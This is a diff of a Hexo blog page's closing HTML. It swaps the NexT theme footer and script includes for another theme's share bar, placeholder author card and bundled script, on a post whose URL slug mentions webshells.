+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/28/webshell/"
+                        aria-label="分享到 Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/28/webshell/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/28/webshell/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
 
-
+            
+        </div>
         
 
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
         
-      </div>
-    </footer>
+            <h4 id="about-card-name">John Doe</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
+<!--SCRIPTS END-->
+
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
-  </div>
 
-  
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
